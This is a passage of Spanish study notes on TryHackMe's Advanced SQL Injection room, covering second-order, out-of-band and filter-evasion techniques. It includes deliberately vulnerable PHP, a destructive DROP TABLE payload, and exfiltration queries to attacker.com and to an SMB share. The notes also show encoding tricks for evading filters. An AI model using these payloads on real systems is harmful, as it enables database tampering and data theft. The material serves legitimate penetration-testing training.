    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/8. Automation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La inyecci√≥n SQL sigue siento una amenaza com√∫n debido a la implementaci√≥n inadecuada de medidas de seguridad y la complejidad de diferentes frameworks web. La identificaci√≥n de automatizaciones y la explotaci√≥n de estas vulnerabilidades puede ser retador, pero hay varias herramientas y t√©cnicas que han sido desarrolladas para ayudar a simplificar este proceso.\n\n-----------------------------------------------\n<h2>Mayores Problemas Durante la Identificaci√≥n</h2>\nIdentificar vulnerabilidades de inyecci√≥n SQL involucra varios retos, similar a identificar cualquier otro tipo de vulnerabilidad del lado del servidor. Aqu√≠ est√°n los problemas clave:\n\n- **Naturaleza din√°mica de las queries SQL:** Las queries SQL pueden ser construidas din√°micamente, haciendo dif√≠cil detectar puntos de inyecci√≥n. las queries complejas con m√∫ltiples capas de l√≥gica pueden ocultar vulnerabilidades potenciales.\n- **Variedad de puntos de inyecci√≥n:** La inyecci√≥n SQL puede ocurrir en diferentes partes de la aplicaci√≥n, incluyendo campos de input, headers HTTP y par√°metros URL. Identificar todos los puntos de inyecci√≥n SQL requiere una comprobaci√≥n a conciencia y entendimiento de la aplicaci√≥n.\n- **Uso de medidas de seguridad:** Las aplicaciones pueden usar statements preparados, queries parametrizadas, y frameworks ORM, los cuales pueden prevenir las inyecciones SQL. Las herramientas automatizadas deben ser capaces de diferenciar entre construcciones de query seguras y no seguras.\n- **Detecci√≥n espec√≠fica del contexto:** El contexto en el que se usan los inputs del usuario en queries SQL puede variar ampliamente. Las herramientas deben adaptarse a diferentes contextos para identificar vulnerabilidades de forma precisa.\n\n---------------------------------------\n<h2>Algunas Herramientas Importantes</h2>\nAlgunas herramientas importantes que han sido desarrolladas por la comunidad para ayudar en la b√∫squeda autom√°tica de vulnerabilidades de inyecci√≥n SQL son:\n\n- **[SQLMap](https://github.com/sqlmapproject/sqlmap):** Herramienta de c√≥digo abierto que automatiza el proceso de detectar y explotar vulnerabilidades SQLi en aplicaciones web.\n- **[SQLNinja](https://github.com/xxgrunge/sqlninja):** Espec√≠ficamente dise√±ada para explotar vulnerabilidades SQLi en aplicaciones web que usan Microsoft SQL server como base de datos en el backend.\n- **[JSQL Injection](https://github.com/ron190/jsql-injection):** Librer√≠a Java focalizada en detectar vulnerabilidades SQLi en aplicaciones Java.\n- **[BBQSQL](https://github.com/CiscoCXSecurity/bbqsql):** Es un framework de Blind SQLi dise√±ado para ser simple y efectivo para este tipo de explotaci√≥n.",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "3. Second-Order SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/3-second-order-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/3. Second-Order SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La second-order SQLi, tambi√©n conocida como SQLi stored, explota vulnerabilidades donde el input dado por el usuario es guardado y despu√©s usado en una parte diferente de la aplicaci√≥n, posiblemente tras un procesado inicial. Este tipo de ataque pasa m√°s desapercibido porque el c√≥digo malicioso SQL no aparece en errores u otros sitios obvios. La inyecci√≥n ocurre en el segundo uso de los datos, cuando es recuperada y usada en un comando SQL, de ah√≠ el nombre.\n\n![[Pasted image 20251229221729.png]]\n\n---------------------------------------\n<h2>Impacto</h2>\nEl peligro de este tipo de inyecci√≥n recae en su habilidad de bypassear defensas t√≠picas del front end como validaci√≥n o sanitizaci√≥n b√°sica, la cual s√≥lo ocurre en el punto inicial de introducci√≥n de informaci√≥n. Como no causa errores durante el primer paso, puede ser sebrese√≠do hasta que ya es demasiado tarde, haci√©ndolo particularmente sigiloso.\n\n<h4>Ejemplo</h4>\nUsaremos una aplicaci√≥n de rese√±as de libros. La aplicaci√≥n permite a los usuarios a√±adir nuevos libros v√≠a una p√°gina web (`add.php`). A los usuarios se les piden los detalles sobre el libro que desean a√±adir a la base de datos. La informaci√≥n recolectada incluye `SSN`, `book_name` y `author`. Consideremos a√±adir un libro con los siguientes detalles: `{SSN:UI00012, book_name:Intro to PHP, author:Tim}`. Esta informaci√≥n se rellena mediante un formulario en la p√°gina `add.php`.\n\n![[Pasted image 20251230172642.png]]\n\nComo ya sabemos, la inyecci√≥n SQL de segundo orden, es notablemente m√°s dif√≠cil de identificar. Al contrario que la inyecci√≥n SQL tradicional, la cual explota en tiempo real las vulnerabilidades, esta ocurre cuando informaci√≥n previamente guardada en la base de datos es usada m√°s adelante  en una query SQL.\n\n<h4>An√°lisis del C√≥digo</h4>\nConsidera el c√≥digo PHP usado en nuestra aplicaci√≥n para a√±adir libros:\n\n```php\nif (isset($_POST['submit'])) {\n\n    $ssn = $conn->real_escape_string($_POST['ssn']);\n\n    $book_name = $conn->real_escape_string($_POST['book_name']);\n\n    $author = $conn->real_escape_string($_POST['author']);\n\n    $sql = \"INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')\";\n\n    if ($conn->query($sql) === TRUE) {\n\n        echo \"<p class='text-green-500'>New book added successfully</p>\";\n\n    } else {\n\n        echo \"<p class='text-red-500'>Error: \" . $conn->error . \"</p>\";\n\n    }\n\n}\n```\n\nEl c√≥digo usa el m√©todo `real_escape_string()` para escapar caracteres especiales en el input. Aunque este m√©todo puede mitigar algunos riesgos de la inyecci√≥n SQL inmediata, no securiza la aplicaci√≥n frente a second-order SQLi. El problema clave es la falta de queries parametrizadas lo que es esencial para prevenir ataques de SQLi. Cuando se inserta la informaci√≥n usando este m√©todo se pueden incluires caracteres que no causan da√±o inmediato, pero que de ser metidos en una query secuencial pueden resultar en inyecci√≥n de segundo orden como `Intro to PHP'; DROP TABLE books;--`.\n\nProbemos a a√±adir un libro con el SSN `test'`.\n\n![[Pasted image 20251230173850.png]]\n\nEl SSN `test'` fue insertado exitosamente en la base de datos. La aplicaci√≥n incluye una funcionalidad para actualizar detalles de un libro a trav√©s de una interfaz como `update.php`. Esta interfaz puede mostrar detalles de libros existentes en campos de formulario. El pentester investigar√° si la aplicaci√≥n reutiliza informaci√≥n como `book_name`. Entonces contruir√≠amos las queries SQL para actualizar registros usando la informaci√≥n manipulada sin sanitizaci√≥n. Manipulando la funcionalidad de actualizaci√≥n, el tester puede ver si el payload malicioso a√±adido se ejecuta durante la operaci√≥n de actualizaci√≥n. Si la aplicaci√≥n no consigue filtrar estos caracteres o emplear buenas pr√°cticas de seguridad, el payload `'; DROP TABLE books; --` podr√≠a activarse llevando a la ejecuci√≥n de un comando SQL malicioso. \n\n![[Pasted image 20251231132601.png]]\n\nRevisemos ahora el c√≥digo de `update.php`. Este script permite a los usuarios actualizar detalles de libros en la base de datos de BookStore. A trav√©s de la estructura query, analizaremos un escenario t√≠pico donde un pentester pueda buscar vulnerabilidades SQLi, especialmente centr√°ndonos en c√≥mo el input se maneja y utiliza en queries SQL.\n\n```php\nif ( isset($_POST['update'])) {\n    $unique_id = $_POST['update'];\n    $ssn = $_POST['ssn_' . $unique_id];\n    $new_book_name = $_POST['new_book_name_' . $unique_id];\n    $new_author = $_POST['new_author_' . $unique_id];\n\n    $update_sql = \"UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');\";\n..\n...\n```\n\nEl script comienza comprobando si el m√©todo de petici√≥n es POST y si el bot√≥n \"Update\" ha sido presionado, indicando que el usuario pretende actualizar los detalles del libro. Siguiendo esto, el script recupera el input del usuario directamente de la informaci√≥n POST.\n\n```php\n$unique_id = $_POST['update'];\n$ssn = $_POST['ssn_' . $unique_id];\n$new_book_name = $_POST['new_book_name_' . $unique_id];\n$new_author = $_POST['new_author_' . $unique_id];\n```\n\nEstas variables son usadas para construir m√°s tarde una query SQL para actualizar los detalles del libro especificado en la base de datos:\n\n```php\n$update_sql = \"UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');\";\n```\n\nEl script usa `multi_query` para ejecutar m√∫ltiples queries. \n\n---------------------------------\n<h2>Preparando el Payload</h2>\nSabemos que podemos a√±adir o modificar los detalles del libro basado en su `ssn`. La query normal para actualizar un libro podr√≠a verse as√≠:\n\n```sql\nUPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '123123';\n```\n\nSin embargo, el comando SQL podr√≠a ser manipulado si un atacante inserta un valor `ssn` constru√≠do por √©l. Por ejemplo, si el atacante usa el valor `ssn`:\n\n```sql\n12345'; UPDATE books SET book_name = 'Hacked'; --\n```\n\nCuando este valor es usado en la query de actualizaci√≥n, finaliza el comando UPDATE despu√©s de `12345` y comienza otro nuevo comando. Esto cambiar√≠a el `book_name` de todas las entradas de la tabla books a **Hacked**.\n\n<h4>Hagamos lo Siguiente</h4>\n1. **Inserci√≥n inicial de Payload:** Un nuevo libro es a√±adido con el payload `12345'; UPDATE books SET book_name = 'Hacked'; --` se inserta en `ssn`. El `;` se usa para terminar el statement SQL actual.\n   \n   ![[Pasted image 20260102124240.png]]\n   \n2. **Ejecuci√≥n SQL Maliciosa:** Despu√©s de eso cuando el admin o cualquier otro usuario visita la URL `update.php`  y lo actualiza, el payload insertado rompe la estructura del comando SQL e inyecta un comando nuevo que actualiza todos los nombres de libros de la tabla books.\n   \n```sql\nUPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345'; Update books set book_name =\"hacked\"; --'; INSERT INTO logs (page) VALUES ('update.php');\n```\n   \n3. **Comentar el resto:** El doble gui√≥n `--`, es un s√≠mbolo de comentario de SQL. Cualquier cosa que siga a `--` ser√° ignorado por el servidor SQL, neutralizando efectivamente cualquier resto del statement SQL original que pudiera causar errores o revelar el ataque. Una vez se ejecuta el payload de arriba se cambian todos los nombres como se muestra.\n   \n   ![[Pasted image 20260102125009.png]]",
    "modified": "2026-01-03T00:51:34"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "Sigue siendo una de las vulnerabilidades m√°s severas y expandidas. Ocurre cuando un atacante consigue explotar una aplicaci√≥n web y ganar la habilidad de ejecutar queries SQL arbitrarias llevando a acceso no autorizado a la base de datos, exfiltraci√≥n de informaci√≥n, manipulaci√≥n de datos o incluso control total sobre la aplicaci√≥n. En esta unidad veremos t√©cnicas avanzadas de inyecci√≥n SQL, entendiendo vectores de ataque sofisticados, as√≠ como estrategias de mitigaci√≥n.\n\n------------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nA lo largo de esta unidad, ganaremos un entendimiento profundo de los siguientes conceptos clave:\n\n- Second-order SQL Injection.\n- Evasi√≥n de Filtros.\n- Out-of-band SQL Injection.\n- T√©cnicas de Automatizaci√≥n.\n- Medidas de Mitigaci√≥n.\n\n------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/0. SQL Injection]]\n- [[0. SQLMap - The Basics]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]\n- [[0. Nmap - The Basics]]\n\n-------------------------------\n<h2>Conectarse a la M√°quina</h2>\nCon√©ctate como normalmente lo haces. Antes de seguir, es clave entender qu√© versi√≥n de base de datos tiene as√≠ como detalles del sistema operativo. Para ello, podemos usar Nmap.\n\n```bash\nthm@machine$ nmap -A -T4 -p 3306,3389,445,139,135 MACHINE_IP\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2024-05-25 12:03 BST\nNmap scan report for MACHINE_IP\nHost is up (0.00034s latency).\n\nPORT     STATE    SERVICE       VERSION\n135/tcp  open     msrpc\n139/tcp  open     netbios-ssn\n445/tcp  open     microsoft-ds\n3306/tcp open     mysql\n3389/tcp open     ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=SQLi\n| Not valid before: 2024-05-23T04:08:44\n|_Not valid after:  2024-11-22T04:08:44\n|_ssl-date: 2024-05-25T11:03:33+00:00; 0s from scanner time.\nMAC Address: 02:87:BD:21:12:33 (Unknown)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: specialized\nRunning (JUST GUESSING): AVtech embedded (87%)\nAggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.67 seconds\n```\n\nEsta m√°quina usa MySQL en Windows.",
    "modified": "2025-12-29T00:58:28"
  },
  {
    "title": "6. Out-of-band SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/6-out-of-band-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/6. Out-of-band SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "La inyecci√≥n SQL out-of-band (OOB) es una t√©cnica de ataque que se usa para exfiltrar informaci√≥n o ejecutar acciones maliciosas cuando los m√©todos tradicionales resultan poco efectivos. Al contrario que la in-band SQLi, donde se usa el mismo canal para el ataque y la obtenci√≥n de informaci√≥n, en la OOB SQLi se usan canales separados para mandar el payload y recibir la respuesta. Las t√©cnicas de OOB SQLi usan funcionalidades como peticiones HTTP, queries DNS, protocolo SMB u otros protocolos de red a los que el servidor de la base de datos tenga acceso, habilitando a que los atacantes puedan circunvalar firewalls, IDSs y otras medidas de seguridad.\n\n![process flow of OOB injection](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1717060822273)\n\nUna de las ventajas principales es el sigilo y confiabilidad. Usando diferentes canales de comunicaci√≥n los atacantes minimizan el riesgo de detecci√≥n y mantienen una conexi√≥n persistente. Por ejemplo, el atacante puede inyectar un payload SQL que dispare una petici√≥n DNS desde el servidor de la base de datos hasta el servidor de un atacante.\n\n----------------------------------\n<h2>¬øPor qu√© usar OOB?</h2>\nEn escenarios donde la respuesta directa est√° sanitizada o limitada por medidas de seguridad, OOB habilita que los atacantes puedan exfiltrar informaci√≥n sin feedback inmediato del servidor. Por ejemplo, los mecanismos de seguridad como procedimientos almacenados, encoding de output y restricciones a nivel de aplicaci√≥n pueden prevenir respuestas directas, haciendo los ataques de inyecci√≥n SQL tradicionales ineficientes. Las t√©cnicas de OOB como peticiones HTTP o DNS permiten que la informaci√≥n sea mandada circunvalando las medidas de protecci√≥n.\n\nAdem√°s, los IDSs y WAFs generalmente monitorizan y registran las respuestas SQL en busca de actividad sospechosa, bloqueando respuestas directas. Usando los dos canales de la OOB, los atacantes pueden evitar este tipo de detecci√≥n usando protocolos de red menos buscados como DNS o SMB. Particularmente efectivo cuando la conectividad entre el atacante y el servidor es limitada, como si este tiene un firewall o est√° en otro segmento de red.\n\n------------------------------------\n<h2>T√©cnicas en Diferentes Bases de Datos</h2>\nLos ataques de inyecci√≥n SQL OOB utilizan la metodolog√≠a de escribir en otro canal de comunicaci√≥n a trav√©s de una query construida. Esta t√©cnica es efectiva para exfiltrar informaci√≥n o realizar acciones maliciosas cuando la interacci√≥n con la base de datos est√° restringida. Hay m√∫ltiples comandos en la base de datos que pueden permitir exfiltraci√≥n pero debajo hay una list de los m√°s usados en varios sistemas de bases de datos.\n\n<h4>MySQL y MariaDB</h4>\nEn MySQL o MariaDB, la inyecci√≥n SQL OOB puede ser alcanzada usando [SELECT ... INTO OUTFILE](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) o el comando [load_file](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file). Este comando permite a los atacantes escribir los resultados de una query en un archivo en el sistema de archivos. Por ejemplo:\n\n```SQL\nSELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';\n```\n\nUn atacante puede despu√©s acceder a este archivo mediante SMB share o un servidor HTTP que corra en el servidor.\n\n<h4>Microsoft SQL Server (MSSQL)</h4>\nEn MSSQL, la inyecci√≥n SQL OOB puede realizarse usando funcionalidades como [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16), la cual permite la ejecuci√≥n de comandos de consola directamente de queries SQL. Esto puede ser usado para escribir la informaci√≥n en un archivo accesible a trav√©s de una network share:\n\n```sql\nEXEC xp_cmdshell 'bcp \"SELECT sensitive_data FROM users\" queryout \"\\\\10.10.58.187\\logs\\out.txt\" -c -T';\n```\n\nAlternativamente, `OPENROWSET` o `BULK INSERT` pueden ser usados para interactuar con las fuentes de informaci√≥n externas, facilitando la exfiltraci√≥n a trav√©s de canales OOB.\n\n<h4>Oracle</h4>\nEn las bases de datos Oracle, OOB SQLi se ejecuta usando los paquetes [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) o [UTF_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html). Por ejemplo, el paquete `UTL_HTTP` puede ser usado para mandar peticiones HTTP con informaci√≥n sensible.\n\n```sql\nDECLARE\n  req UTL_HTTP.REQ;\n  resp UTL_HTTP.RESP;\nBEGIN\n  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);\n  UTL_HTTP.GET_RESPONSE(req);\nEND;\n```\n\n------------------------------------------\n<h2>Ejemplos de T√©cnicas Out-Of-Band SQLi</h2>\nLas t√©cnicas de OOB SQLi en MySQL y MariaDB pueden utilizar varios protocolos de red para exfiltrar datos. Los m√©todos primarios incluyen exfiltraci√≥n DNS, peticiones HTTP y shares SMB. Cada una de estas puede ser aplicada dependiendo de las capabilities del entorno MySQL/MariaDB y el setup de red.\n\n<h4>Peticiones HTTP</h4>\nUsando funciones de bases de datos que permiten peticiones HTTP, los atacantes pueden mandar informaci√≥n sensible directamente a un servidor web que controlan. Este m√©todo explota las funcionalidades de la base de datos que pueden dirigir hacia fuera las conexiones HTTP. Aunque MySQL y MariaDB no soportan peticiones HTTP de forma nativa puede hacerse mediante scripts externos o UDFs (User Defined Functions) si la base de datos lo permite.\n\nPrimero, la UDF necesita ser creada e instalada para soportar peticiones HTTP. Este setup es complejo y suele involucrar configuraci√≥n adicional. Una query de ejemplo ser√≠a as√≠: `SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;`. La exfiltraci√≥n mediante peticiones HTTP puede ser implementada en Windows y Linux dependiendo del soporte de la base de datos de scripts externos o UDFs que las permitan.\n\n<h4>Exfiltraci√≥n DNS</h4>\nLos atacantes pueden usar queries SQL para generar peticiones DNS con informaci√≥n encodeada, la cual se manda a un servidor DNS malicioso. Esta t√©cnica sobrepasa filtros de monitorizaci√≥n basados en HTTP y se aprovecha  de la capacidad de la base de datos para realizar lookups DNS.\n\nComo ya hemos hablado, MySQL no tiene soporte nativo para generar peticiones DNS a trav√©s de √∫nicamente comandos SQL. Los atacantes pueden usar otros medios para conseguirlo como UDFs o scripts de sistema para realizar consultas DNS.\n\n<h4>Exfiltraci√≥n SMB</h4>\nInvolucra escribir los resultados de la query en una share SMB en un servidor externo. Esta t√©cnica es particularmente efectiva en entornos Windows pero tambi√©n puede configurarse en sistemas Linux con el setup indicado. Un ejemplo de la query se ver√≠a as√≠: `SELECT sensitive_data INTO OUTFILE '\\\\\\\\10.10.162.175\\\\logs\\\\out.txt';`.\n\nEsto est√° completamente soportado ya que Windows soporta nativamente las rutas SMB/UNC. Aunque las rutas SMB son m√°s nativas de Windows, las shares SMB pueden montarse y ser accedidas usando herramientas como `smbclient` o mont√°ndolas en un directorio local. Usar directamente rutas UNC en queries SQL puede requerir setup adicional o scripts para facilitar la interacci√≥n.\n\n-----------------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\nEn este escenario pr√°ctico, demostraremos c√≥mo un atacante puede exfiltrar informaci√≥n de una aplicaci√≥n web vulnerable usando una t√©cnica de inyecci√≥n SQL OOB. El lado del servidor contiene una vulnerabilidad de inyecci√≥n SQL la cual permite construir un payload que escribe los resultados de la query en una share SMB externa.\n\n<h4>Explicaci√≥n del Escenario</h4>\nEn este escenario, habilitar√≠amos una network share en `ATTACKBOX_IP\\logs`. Esta share es accesible a trav√©s de la red y permite que archivos de otras m√°quinas sean escritos en ella. Para hacer esto, arrancamos la AttackBox y ejecutamos lo siguiente:\n\n1. Navegamos hasta el directorio `impacket` usando `cd /opt/impacket/examples`.\n2. Introducimos el comando `python3.9 smbserver.py -smb2support -comment \"My Logs Server\" -debug logs /tmp`.\n3. Puedes acceder a los contenidos de la network share introduciendo el comando `smbclient //ATTACKBOX_IP/logs -U guest -N`. Esto te permite conectarte a la network share y ah√≠ puedes usar `ls` para listar todos los comandos.\n\nTenemos la misma aplicaci√≥n web con una funcionalidad de b√∫squeda. El c√≥digo del lado del servidor para esta funcionalidad es vulnerable a inyecci√≥n SQL y puedes acceder a √©l en `http://10.65.188.152/oob/search_visitor.php?visitor_name=Tim`.\n\n![[Pasted image 20260110145327.png]]\n\nEl c√≥digo del servidor se ve as√≠:\n\n```php\n$visitor_name = $_GET['visitor_name'] ?? '';\n\n$sql = \"SELECT * FROM visitor WHERE name = '$visitor_name'\";\n\necho \"<p>Generated SQL Query: $sql</p>\";\n\n// Execute multi-query\nif ($conn->multi_query($sql)) {\n    do {\n        // Store first result set\n        if ($result = $conn->store_result()) {\n            if ($result->num_rows > 0) {\n                while ($row = $result->fetch_assoc()) {\n```\n\n<h4>Consideraci√≥n Importante</h4>\nEs importante saber que la variable de sistema MySQL `secure_file_priv` puede estar configurada. Cuando lo est√°, esta variable contiene la ruta del directorio, y MySQL s√≥lo permite que los archivos se escriban en ese directorio. Esta medida de seguridad ayuda a mitigar el riesgo de operaciones de archivo no autorizadas.\n\n- **Cuando `secure_file_priv` est√° configurada:** MySQL restringir√° las operaciones de archivos como `INTO OUTFILE` al directorio especificado. Esto significa que los atacantes no podr√°n exfiltrar a localizaciones arbitrarias.\n- **Cuando `secure_file_priv` no est√° configurada:** Si la variable `secure_file_priv` est√° vac√≠a, MySQL no impone restricciones de directorio, permitiendo que los archivos sean escritos a cualquier directorio accesible por el proceso del servidor MySQL.\n\nLos atacantes no suelen tener acceso al valor de la variable `secure_file_priv`. Como resultado, deben confiar en m√©todos de prueba y error para determinar si pueden y d√≥nde pueden escribir archivos, comprobando varias rutas.\n\n<h4>Preparando el Payload</h4>\nPara explotar esta vulnerabilidad el atacante configura un payload para inyectar en el par√°metro `visitor_name`. El payload ser√° dise√±ado para ejecutar una query SQL adicional que escriba la versi√≥n de la base de datos a una share SMB externa.\n\n```sql\n1'; SELECT @@version INTO OUTFILE '\\\\\\\\ATTACKBOX_IP\\\\logs\\\\out.txt'; --\n```\n\nDiseccionemos el payload:\n\n- `1'`: Cierra la string original en la query SQL.\n- `;`: Termina el primer statement SQL.\n- `SELECT @@version INTO OUTFILE '\\\\\\\\ATTACKBOX_IP\\\\logs\\\\out.txt';`: Ejecuta un nuevo statement SQL que devuelve la versi√≥n de la base de datos y la escribe en una share SMB en `\\\\ATTACKBOX_IP\\logs\\output.txt`.\n- `--`: Comenta el resto de la query SQL original para prevenir errores de sintaxis.\n\nPara utilizar el payload, el atacante visitar√≠a la URL que crea un archivo en la share SMB externa.\n\nPara acceder al archivo usa `ls /tmp` para ver el archivo recibido en el directorio `/tmp`.",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "9. Best Practices",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/9-best-practices/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/9. Best Practices.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "SQLi es una vulnerabilidad con renombre que ha sido el principal quebradero de cabeza en la seguridad de aplicaciones durante a√±os. Los pentesters deben prestar especial atenci√≥n a esta vulnerabilidad durante sus pruebas, ya que requiere un entendimiento concienzudo de varias t√©cnicas para identificar y explotar puntos de inyecci√≥n SQL. De la misma manera, los desarrolladores deben conocer e implementar las mejores pr√°cticas para proteger sus aplicaciones.\n\n--------------------------------------\n<h2>Secure Coders</h2>\n- **Queries parametrizadas y statements preparados:** √ösalos para asegurar que el input del usuario se trate como informaci√≥n en lugar de c√≥digo ejecutable. Por ejemplo en PHP con PDO puedes preparar statements y par√°metros de uni√≥n como `$stmt = $pdo->prepare(\"SELECT * FROM users WHERE username = :username\"); $stmt->execute(['username' => $username]);`.\n- **Validaci√≥n y sanitizaci√≥n del input:** Implementa una validaci√≥n y sanitizaci√≥n robusta para asegurar que la informaci√≥n recibida del usuario es la que deber√≠a ser. Usa funciones integradas como `htmlspecialchars()` y `filter_var()`.\n- **Principio de menor privilegio:** Aplica este principio garantizando que los usuarios tienen S√ìLO los privilegios suficientes para realizar su trabajo y ya.\n- **Procedimientos almacenados:** Encapsula y valida la l√≥gica SQL usando procedimientos almacenados.Esto te permite controlar y validar los inputs de la base de datos.\n- **Auditor√≠as y revisiones de c√≥digo regulares:** Realiza auditor√≠as de seguridad y revisiones de c√≥digo de forma regular para identificar y solucionar vulnerabilidades.\n\n----------------------------------------------------\n<h2>Pentesters</h2>\n- **Explotar funcionalidades espec√≠ficas de la base de datos:** Diferentes sistemas de manejo de bases de datos (DBMS) tienen funcionalidades y sintaxis √∫nicas. Deber√≠as entender las espec√≠ficas del DBMS objetivo.\n- **Aprovecharse de mensajes de error:** Explota errores de verbose para ganar informaci√≥n del esquema y estructura de la base de datos .Por ejemplo, `1' AND 1=CONVERT(int, (SELECT @@version)) --` puede generar errores que filtren la versi√≥n.\n- **Bypassear WAFs y filtros:** Prueba varias t√©cnicas de ofuscaci√≥n para bypassear WAFs y filtros de input como hemos visto en esta unidad (concatenaci√≥n, mixed case, inline comments, different encodings, etc.).\n- **Identificar la base de datos:** Determina el tipo y la versi√≥n de la base de datos para hacer el ataque a su medida. Puedes hacer esto con queries como `SELECT version()` o `SELECT @@version`.\n- **Pivotar con la inyecci√≥n SQL:** Usa la inyecci√≥n SQL para pivotar y atacar otras partes de la red.",
    "modified": "2026-01-11T01:00:33"
  },
  {
    "title": "4. Filter Evasion Techniques",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/1-advanced-sql-injection/4-filter-evasion-techniques/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/1. Advanced SQL Injection/4. Filter Evasion Techniques.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 1. Advanced SQL Injection",
    "content": "En los ataques de inyecci√≥n SQL avanzados, evadir filtros es crucial para explotar las vulnerabilidades exitosamente. Las aplicaciones web modernas normalmente implementan medidas defensivas para sanitizar o bloquear patrones de ataque comunes, haciendo los intentos de inyecci√≥n SQL simple inefectivos. Para esto debemos adaptarnos y llevar a cabo t√©cnicas m√°s sofisticadas. Esta secci√≥n cubrir√° estos m√©todos incluyendo encoding de caracteres, inyecci√≥n SQL sin commillas y c√≥mo manejar escenarios donde no podemos usar espacios.\n\n--------------------------------------\n<h2>Character Encoding</h2>\nInvolucra convertir caracteres especiales en el payload de inyecci√≥n SQL en formas encodeadas que puedan sobrepasar filtros.\n\n- **URL Encoding:** El encodding URL es un m√©todo com√∫n donde los caracteres se representan usando un porcentaje seguido de su valor en hexadecimal ASCII. Por ejemplo el payload `'OR 1=1--` puede encodearse como `%27%20OR%201%3D1--`.\n- **Hexadecimal Encoding:** Es otra t√©cnica efectiva para construir queries SQL usando valores hexadecimales. Por ejemplo, la query `SELECT * FROM users WHERE name = 'admin'` puede ser encodeada como `SELECT * FROM users WHERE name = 0x61646d696e`.\n- **Unicode Encoding:** Representa caracteres usando las secuencias de escape Unicode. Por ejemplo, la string `admin` puede ser encodeada como `\\u0061\\u0064\\u006d\\u0069\\u006e`.\n\n<h4>Ejemplo</h4>\nEn este ejemplo exploraremos c√≥mo los desarrolladores pueden implementar filtros para prevenir los ataques de inyecci√≥n SQL eliminando ciertas palabras clave y caracteres del input del usuario. Tambi√©n veremos c√≥mo los atacantes pueden sobrepasarlos usando t√©cnicas de encodeado.\n\nAqu√≠ est√° el c√≥digo PHP (`search_books.php`) que maneja la funcionalidad de buscado.\n\n```php\n$book_name = $_GET['book_name'] ?? '';\n$special_chars = array(\"OR\", \"or\", \"AND\", \"and\" , \"UNION\", \"SELECT\");\n$book_name = str_replace($special_chars, '', 